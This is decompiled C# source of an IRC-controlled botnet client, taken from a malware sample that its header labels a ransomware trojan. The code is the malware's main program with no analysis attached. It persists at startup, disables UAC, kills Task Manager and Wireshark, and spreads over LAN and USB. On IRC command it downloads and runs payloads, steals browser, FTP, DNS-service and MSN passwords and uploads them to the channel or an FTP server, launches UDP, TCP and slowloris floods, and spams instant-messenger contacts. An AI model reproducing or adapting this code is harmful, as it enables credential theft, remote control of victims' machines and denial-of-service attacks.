// Decompiled with JetBrains decompiler
// Type: rundll32.Program
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using rundll32.bruteforce;
using rundll32.encryption;
using rundll32.floods;
using rundll32.spreaders;
using rundll32.stealers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace rundll32
{
  internal static class Program
  {
    private static Thread mutexThread;
    private static Thread antiProcThread = new Thread(new ThreadStart(Program.antiProcLoop));
    public static bool firstRun = false;
    public static bool usbRun = false;
    private static irc _irc;
    private static bool connected = false;
    private static bool anticlone = false;
    public static List<ircUser> loggedInUsers = new List<ircUser>();

    private static void mutexLoop()
    {
      if (!new Mutex(false, config.mutex).WaitOne(0, false))
        Process.GetCurrentProcess().Kill();
      while (true)
        Thread.Sleep(1000);
    }

    private static void antiProcLoop()
    {
      try
      {
        if (Process.GetCurrentProcess().MainModule.FileName.ToLower().Contains("sample"))
          Process.GetCurrentProcess().Kill();
      }
      catch
      {
      }
      while (true)
      {
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName.Contains("taskmgr"))
              process.Kill();
            if (process.ProcessName.Contains("wireshark"))
              process.Kill();
          }
          Thread.Sleep(10);
        }
        catch
        {
        }
      }
    }

    [STAThread]
    private static void Main(string[] args)
    {
      try
      {
        if (args[0].Contains("usb"))
          Program.usbRun = true;
        if (args[0].Contains("new"))
          Program.firstRun = true;
      }
      catch
      {
      }
      misc.copyToStartup(config.dirs, config.names);
      Program.mutexThread = new Thread(new ThreadStart(Program.mutexLoop));
      Program.mutexThread.Start();
      Program.antiProcThread.Start();
      antis.Check();
      config.loadVars();
      Program.loggedInUsers.Add(new ircUser((irc) null, "127.0.0.1", "Topic", "Topic"));
      Program.connect();
      while (!Program.connected)
        Thread.Sleep(500);
      usblistener.start(Program._irc);
      misc.disableUAC();
      if (!Program.firstRun)
        return;
      lan.spread(Application.ExecutablePath, Program._irc);
    }

    private static void connect()
    {
      string newValue = new Random().Next(10000, 99999).ToString();
      Program._irc = new irc(new ircConnectionDetails(config.host, config.port), new ircUser((irc) null, config.nick.Replace("%rand%", newValue), config.user.Replace("%rand%", newValue)));
      Program._irc.onConnection += new irc.onConnectionDelegate(Program._irc_onConnection);
      Program._irc.onMessageReceived += new irc.onMessageReceivedDelegate(Program._irc_onMessageReceived);
      Program._irc.connect();
    }

    public static void _irc_onConnection(irc irc)
    {
      Program.connected = true;
      foreach (string[] onConnChannel in config.onConnChannels)
        irc.sendJoin(onConnChannel[0], onConnChannel[1]);
      if (Program.firstRun)
      {
        foreach (string[] infectionChannel in config.onNewInfectionChannels)
          irc.sendJoin(infectionChannel[0], infectionChannel[1]);
      }
      if (!Program.usbRun)
        return;
      foreach (string[] infectionChannel in config.onUsbInfectionChannels)
        irc.sendJoin(infectionChannel[0], infectionChannel[1]);
    }

    public static bool isLoggedIn(ircUser u) => Program.loggedInUsers.Contains(u);

    public static void _irc_onMessageReceived(irc irc, ircMessage msg)
    {
      functionResponse functionResponse = functionParser.parse(msg);
      if (functionResponse == null)
        return;
      if (Program.isLoggedIn(msg.user))
      {
        switch (functionResponse.Name.ToLower())
        {
          case "say":
            if (functionResponse.Arguments.Length != 1)
              break;
            irc.sendMessage(msg.channel, functionResponse.Arguments[0].Value.ToString());
            break;
          case "kill":
            if (functionResponse.Arguments.Length == 0)
            {
              irc.sendQuit("Killed by: " + msg.user.nick);
              Thread.Sleep(500);
              Process.GetCurrentProcess().Kill();
              break;
            }
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            irc.sendQuit("Killed by: " + msg.user.nick + " Reason: " + functionResponse.Arguments[0].Value);
            Thread.Sleep(500);
            Process.GetCurrentProcess().Kill();
            break;
          case "dl":
            if (functionResponse.Arguments.Length == 3)
            {
              if ((object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string))
                break;
              if ((object) functionResponse.Arguments[2].Type != (object) typeof (bool))
                break;
              try
              {
                misc.download((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value, (bool) functionResponse.Arguments[2].Value);
                if ((bool) functionResponse.Arguments[2].Value)
                {
                  irc.sendMessage(msg.channel, ".:Download:. - \u000309Downloaded & executed successfully!");
                  break;
                }
                irc.sendMessage(msg.channel, ".:Download:. - \u000309Downloaded successfully!");
                break;
              }
              catch (Exception ex)
              {
                irc.sendMessage(msg.channel, ".:Download:. - \u000304Error thrown: " + ex.GetType().ToString());
                break;
              }
            }
            else
            {
              if (functionResponse.Arguments.Length != 2 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
                break;
              if ((object) functionResponse.Arguments[1].Type != (object) typeof (string))
                break;
              try
              {
                misc.download((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value, true);
                irc.sendMessage(msg.channel, ".:Download:. - \u000309Downloaded & executed successfully!");
                break;
              }
              catch (Exception ex)
              {
                irc.sendMessage(msg.channel, ".:Download:. - \u000304Error thrown: " + ex.GetType().ToString());
                break;
              }
            }
          case "encdl":
            if (functionResponse.Arguments.Length == 3)
            {
              if ((object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string))
                break;
              if ((object) functionResponse.Arguments[2].Type != (object) typeof (string))
                break;
              try
              {
                misc.download(sll.decrypt((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[2].Value), (string) functionResponse.Arguments[1].Value, true);
                irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000309Downloaded & executed successfully!");
                break;
              }
              catch (Exception ex)
              {
                irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000304Error thrown: " + ex.GetType().ToString());
                break;
              }
            }
            else
            {
              if (functionResponse.Arguments.Length != 4 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string) || (object) functionResponse.Arguments[2].Type != (object) typeof (string))
                break;
              if ((object) functionResponse.Arguments[3].Type != (object) typeof (bool))
                break;
              try
              {
                misc.download(sll.decrypt((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[2].Value), (string) functionResponse.Arguments[1].Value, (bool) functionResponse.Arguments[3].Value);
                if ((bool) functionResponse.Arguments[3].Value)
                {
                  irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000309Downloaded & executed successfully!");
                  break;
                }
                irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000309Downloaded successfully!");
                break;
              }
              catch (Exception ex)
              {
                irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000304Error thrown: " + ex.GetType().ToString());
                break;
              }
            }
          case "updt":
            if (functionResponse.Arguments.Length != 2 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string))
              break;
            if (!((string) functionResponse.Arguments[1].Value == config.updatePwd))
              break;
            try
            {
              misc.download((string) functionResponse.Arguments[0].Value, new Random().Next(1000, 99990).ToString() + ".exe", true);
              misc.remove(config.dirs, config.names);
              irc.sendMessage(msg.channel, ".:Update:. - \u000309Updated successfully!");
              irc.sendQuit("Updated by: " + msg.user.nick);
              Thread.Sleep(500);
              Process.GetCurrentProcess().Kill();
              break;
            }
            catch (Exception ex)
            {
              irc.sendMessage(msg.channel, ".:Update:. - \u000304Error thrown: " + ex.GetType().ToString());
              break;
            }
          case "encupdt":
            if (functionResponse.Arguments.Length != 3 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string) || (object) functionResponse.Arguments[2].Type != (object) typeof (string))
              break;
            if (!((string) functionResponse.Arguments[1].Value == config.updatePwd))
              break;
            try
            {
              misc.download(sll.decrypt((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[2].Value), new Random().Next(1000, 99990).ToString() + ".exe", true);
              misc.remove(config.dirs, config.names);
              irc.sendMessage(msg.channel, ".:Encrypted Update:. - \u000309Updated successfully!");
              irc.sendQuit("Updated by: " + msg.user.nick);
              Thread.Sleep(500);
              Process.GetCurrentProcess().Kill();
              break;
            }
            catch (Exception ex)
            {
              irc.sendMessage(msg.channel, ".:Encrypted Update:. - \u000304Error thrown: " + ex.GetType().ToString());
              break;
            }
          case "rem":
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || !((string) functionResponse.Arguments[0].Value).Equals(config.remPwd))
              break;
            misc.remove(config.dirs, config.names);
            irc.sendMessage(msg.channel, ".:Remove:. - \u000313Remove Successfull!");
            irc.sendQuit("Removed by: " + msg.user.nick);
            Thread.Sleep(500);
            Process.GetCurrentProcess().Kill();
            break;
          case "xor.enc":
            if (functionResponse.Arguments.Length != 2)
              break;
            irc.sendNotice(msg.user.nick, xor.encrypt((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value));
            break;
          case "xor.dec":
            if (functionResponse.Arguments.Length != 2)
              break;
            irc.sendNotice(msg.user.nick, xor.decrypt((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value));
            break;
          case "sll.enc":
            if (functionResponse.Arguments.Length != 2)
              break;
            irc.sendNotice(msg.user.nick, sll.encrypt((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value));
            break;
          case "sll.dec":
            if (functionResponse.Arguments.Length != 2)
              break;
            irc.sendNotice(msg.user.nick, sll.decrypt((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value));
            break;
          case "md5.start":
            if (functionResponse.Arguments.Length != 4 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string) || (object) functionResponse.Arguments[2].Type != (object) typeof (int) || (object) functionResponse.Arguments[3].Type != (object) typeof (int))
              break;
            md5.start(irc, msg.channel, (string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value, (int) functionResponse.Arguments[2].Value, (int) functionResponse.Arguments[3].Value);
            break;
          case "md5.stop":
            if (functionResponse.Arguments.Length != 0)
              break;
            md5.stop(irc, msg.channel);
            break;
          case "join":
            if (functionResponse.Arguments.Length == 1)
            {
              if ((object) functionResponse.Arguments[0].Type != (object) typeof (string))
                break;
              irc.sendJoin((string) functionResponse.Arguments[0].Value);
              break;
            }
            if (functionResponse.Arguments.Length != 2 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            irc.sendJoin((string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value);
            break;
          case "part":
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            irc.sendPart((string) functionResponse.Arguments[0].Value);
            break;
          case "raw":
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            irc.send((string) functionResponse.Arguments[0].Value);
            break;
          case "ff":
            if (functionResponse.Arguments.Length != 0)
              break;
            try
            {
              foreach (ff.ffEntry ffEntry in ff.steal())
                irc.sendMessage(msg.channel, ".:Firefox:. - \u000310Host: \u000311" + ffEntry.host + "\u000310 User: \u000311" + ffEntry.user + "\u000310 Pass: \u000311" + ffEntry.pass);
              break;
            }
            catch
            {
              break;
            }
          case "ff.search":
            if (functionResponse.Arguments.Length != 1)
              break;
            if ((object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            try
            {
              foreach (ff.ffEntry ffEntry in ff.steal())
              {
                if (ffEntry.host.Contains((string) functionResponse.Arguments[0].Value))
                  irc.sendMessage(msg.channel, ".:Firefox:. - \u000310Host: \u000311" + ffEntry.host + "\u000310 User: \u000311" + ffEntry.user + "\u000310 Pass: \u000311" + ffEntry.pass);
              }
              break;
            }
            catch
            {
              break;
            }
          case "fz":
            if (functionResponse.Arguments.Length != 0)
              break;
            try
            {
              foreach (fz.fzEntry fzEntry in fz.steal())
                irc.sendMessage(msg.channel, ".:FileZilla:. - \u000310Host: \u000311" + fzEntry.host + "\u000310 User: \u000311" + fzEntry.user + "\u000310 Pass: \u000311" + fzEntry.pass);
              break;
            }
            catch
            {
              break;
            }
          case "noip":
            if (functionResponse.Arguments.Length != 0)
              break;
            try
            {
              noip.acount acount = noip.steal();
              irc.sendMessage(msg.channel, ".:No-Ip:. - \u000310 User: \u000311" + acount.user + "\u000310 Pass: \u000311" + acount.pass);
              break;
            }
            catch
            {
              break;
            }
          case "dyndns":
            if (functionResponse.Arguments.Length != 0)
              break;
            try
            {
              dyndns.acount acount = dyndns.steal();
              irc.sendMessage(msg.channel, ".:DynDns:. - \u000310 User: \u000311" + acount.user + "\u000310 Pass: \u000311" + acount.pass);
              break;
            }
            catch
            {
              break;
            }
          case "msn":
            if (functionResponse.Arguments.Length != 0)
              break;
            try
            {
              rundll32.stealers.msn.acount acount = rundll32.stealers.msn.steal();
              if (acount.pass.Length < 3)
                throw new Exception();
              irc.sendMessage(msg.channel, ".:MSN:. - \u000310 User: \u000311" + acount.user + "\u000310 Pass: \u000311" + acount.pass);
              break;
            }
            catch
            {
              break;
            }
          case "steal":
            if (functionResponse.Arguments.Length != 0)
              break;
            try
            {
              foreach (ff.ffEntry ffEntry in ff.steal())
                irc.sendMessage(msg.channel, ".:Firefox:. - \u000310Host: \u000311" + ffEntry.host + "\u000310 User: \u000311" + ffEntry.user + "\u000310 Pass: \u000311" + ffEntry.pass);
            }
            catch
            {
            }
            try
            {
              foreach (fz.fzEntry fzEntry in fz.steal())
                irc.sendMessage(msg.channel, ".:FileZilla:. - \u000310Host: \u000311" + fzEntry.host + "\u000310 User: \u000311" + fzEntry.user + "\u000310 Pass: \u000311" + fzEntry.pass);
            }
            catch
            {
            }
            try
            {
              noip.acount acount = noip.steal();
              irc.sendMessage(msg.channel, ".:No-Ip:. - \u000310 User: \u000311" + acount.user + "\u000310 Pass: \u000311" + acount.pass);
            }
            catch
            {
            }
            try
            {
              dyndns.acount acount = dyndns.steal();
              irc.sendMessage(msg.channel, ".:DynDns:. - \u000310 User: \u000311" + acount.user + "\u000310 Pass: \u000311" + acount.pass);
            }
            catch
            {
            }
            try
            {
              rundll32.stealers.msn.acount acount = rundll32.stealers.msn.steal();
              if (acount.pass.Length < 3)
                throw new Exception();
              irc.sendMessage(msg.channel, ".:MSN:. - \u000310 User: \u000311" + acount.user + "\u000310 Pass: \u000311" + acount.pass);
              break;
            }
            catch
            {
              break;
            }
          case "steal.log":
            string ftpHost = config.ftp_host;
            int ftpPort = config.ftp_port;
            string ftpUser = config.ftp_user;
            string ftpPass = config.ftp_pass;
            string ftpPath = config.ftp_path;
            bool flag = false;
            if (functionResponse.Arguments.Length == 0)
              flag = true;
            if (functionResponse.Arguments.Length == 5 && (object) functionResponse.Arguments[0].Type == (object) typeof (string) && (object) functionResponse.Arguments[1].Type == (object) typeof (int) && (object) functionResponse.Arguments[2].Type == (object) typeof (string) && (object) functionResponse.Arguments[3].Type == (object) typeof (string) && (object) functionResponse.Arguments[4].Type == (object) typeof (string))
            {
              ftpHost = (string) functionResponse.Arguments[0].Value;
              ftpPort = (int) functionResponse.Arguments[1].Value;
              ftpUser = (string) functionResponse.Arguments[2].Value;
              ftpPass = (string) functionResponse.Arguments[3].Value;
              ftpPath = (string) functionResponse.Arguments[4].Value;
              flag = true;
            }
            if (!flag)
              break;
            string contents = "" + "==============================\r\n";
            try
            {
              foreach (ff.ffEntry ffEntry in ff.steal())
              {
                contents += "Type: Firefox\r\n";
                contents = contents + "Host: " + ffEntry.host + "\r\n";
                contents = contents + "User: " + ffEntry.user + "\r\n";
                contents = contents + "Pass: " + ffEntry.pass + "\r\n";
                contents += "==============================\r\n";
              }
            }
            catch
            {
            }
            try
            {
              foreach (fz.fzEntry fzEntry in fz.steal())
              {
                contents += "Type: FileZilla\r\n";
                contents = contents + "Host: " + fzEntry.host + "\r\n";
                contents = contents + "User: " + fzEntry.user + "\r\n";
                contents = contents + "Pass: " + fzEntry.pass + "\r\n";
                contents += "==============================\r\n";
              }
            }
            catch
            {
            }
            try
            {
              noip.acount acount = noip.steal();
              contents += "Type: No-Ip\r\n";
              contents = contents + "User: " + acount.user + "\r\n";
              contents = contents + "Pass: " + acount.pass + "\r\n";
              contents += "==============================\r\n";
            }
            catch
            {
            }
            try
            {
              dyndns.acount acount = dyndns.steal();
              contents += "Type: DynDNS\r\n";
              contents = contents + "User: " + acount.user + "\r\n";
              contents = contents + "Pass: " + acount.pass + "\r\n";
              contents += "==============================\r\n";
            }
            catch
            {
            }
            try
            {
              rundll32.stealers.msn.acount acount = rundll32.stealers.msn.steal();
              if (acount.pass.Length < 3)
                throw new Exception();
              contents += "Type: MSN\r\n";
              contents = contents + "User: " + acount.user + "\r\n";
              contents = contents + "Pass: " + acount.pass + "\r\n";
              contents += "==============================\r\n";
            }
            catch
            {
            }
            if (!(contents != "==============================\r\n"))
              break;
            try
            {
              ftp ftp = new ftp(ftpHost, ftpPort, ftpUser, ftpPass);
              ftp.connect();
              Thread.Sleep(250);
              ftp.changeDir(ftpPath);
              Thread.Sleep(250);
              ftp.writeFile(misc.GetVolumeSerial("c") + ".txt", contents);
              Thread.Sleep(250);
              do
                ;
              while (ftp._data.Connected);
              ftp.close();
              irc.sendMessage(msg.channel, ".:Steal:. - \u000309Logged successfully to ftp!");
              break;
            }
            catch
            {
              break;
            }
          case "udp.start":
            if (functionResponse.Arguments.Length != 5 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (int) || (object) functionResponse.Arguments[2].Type != (object) typeof (int) || (object) functionResponse.Arguments[3].Type != (object) typeof (int) || (object) functionResponse.Arguments[4].Type != (object) typeof (int) || !udp.start((string) functionResponse.Arguments[0].Value, (int) functionResponse.Arguments[1].Value, (int) functionResponse.Arguments[2].Value, (int) functionResponse.Arguments[3].Value, (int) functionResponse.Arguments[4].Value))
              break;
            irc.sendMessage(msg.channel, ".:UDP:. - \u000304Flooding started on \u000307" + (string) functionResponse.Arguments[0].Value + ":" + functionResponse.Arguments[1].Value.ToString() + "\u000304!");
            break;
          case "udp.stop":
            if (functionResponse.Arguments.Length != 0)
              break;
            try
            {
              long bytes = udp.stop();
              irc.sendMessage(msg.channel, ".:UDP:. - \u000304Stopped flooding (\u000307 " + misc.FormatBytes(bytes) + "/s\u000304 average)!");
              break;
            }
            catch
            {
              break;
            }
          case "tcp.start":
            if (functionResponse.Arguments.Length != 4 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (int) || (object) functionResponse.Arguments[2].Type != (object) typeof (int) || (object) functionResponse.Arguments[3].Type != (object) typeof (int) || !tcp.start((string) functionResponse.Arguments[0].Value, (int) functionResponse.Arguments[1].Value, (int) functionResponse.Arguments[2].Value, (int) functionResponse.Arguments[3].Value))
              break;
            irc.sendMessage(msg.channel, ".:TCP:. - \u000304Flooding started on \u000307" + (string) functionResponse.Arguments[0].Value + ":" + functionResponse.Arguments[1].Value.ToString() + "\u000304!");
            break;
          case "tcp.stop":
            if (functionResponse.Arguments.Length != 0 || !tcp.stop())
              break;
            irc.sendMessage(msg.channel, ".:TCP:. - \u000304Stopped flooding!");
            break;
          case "sls.start":
            if (functionResponse.Arguments.Length != 3 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (int) || (object) functionResponse.Arguments[2].Type != (object) typeof (int) || !sls.start((string) functionResponse.Arguments[0].Value, (int) functionResponse.Arguments[1].Value, (int) functionResponse.Arguments[2].Value))
              break;
            irc.sendMessage(msg.channel, ".:SLS:. - \u000304Flooding started on \u000307" + (string) functionResponse.Arguments[0].Value + "\u000304!");
            break;
          case "sls.stop":
            if (functionResponse.Arguments.Length != 0 || !sls.stop())
              break;
            irc.sendMessage(msg.channel, ".:SLS:. - \u000304Stopped flooding!");
            break;
          case "torr":
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            torrent.seed(irc, (string) functionResponse.Arguments[0].Value);
            break;
          case "msn.msg":
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            im.msn.sendMsg(irc, (string) functionResponse.Arguments[0].Value);
            break;
          case "msn.file":
            if (functionResponse.Arguments.Length != 2 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string))
              break;
            im.msn.sendFile(irc, (string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value);
            break;
          case "msn.zip":
            if (functionResponse.Arguments.Length != 3 || (object) functionResponse.Arguments[0].Type != (object) typeof (string) || (object) functionResponse.Arguments[1].Type != (object) typeof (string) || (object) functionResponse.Arguments[2].Type != (object) typeof (string))
              break;
            im.msn.sendZipFile(irc, (string) functionResponse.Arguments[0].Value, (string) functionResponse.Arguments[1].Value, (string) functionResponse.Arguments[2].Value);
            break;
          case "aim.msg":
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            im.aim.sendMsg(irc, (string) functionResponse.Arguments[0].Value);
            break;
          case "vis":
            if (functionResponse.Arguments.Length != 1 || (object) functionResponse.Arguments[0].Type != (object) typeof (string))
              break;
            Process.Start(new ProcessStartInfo()
            {
              FileName = (string) functionResponse.Arguments[0].Value,
              WindowStyle = ProcessWindowStyle.Hidden
            });
            break;
          case "logout":
            if (functionResponse.Arguments.Length != 0)
              break;
            Program.loggedInUsers.Remove(msg.user);
            irc.sendMessage(msg.channel, ".:Logout:. - \u000309Logged out successfully!");
            break;
        }
      }
      else
      {
        switch (functionResponse.Name.ToLower())
        {
          case "login":
            if (functionResponse.Arguments.Length != 1)
              break;
            if (functionResponse.Arguments[0].Value.Equals((object) config.loginPwd) && (object) functionResponse.Arguments[0].Type == (object) typeof (string))
            {
              irc.sendMessage(msg.channel, ".:Login:. - \u000309Welcome, " + msg.user.nick);
              Program.loggedInUsers.Add(msg.user);
              break;
            }
            irc.sendMessage(msg.channel, ".:Login:. - \u000304Access Denied, " + msg.user.nick);
            break;
        }
      }
    }
  }
}
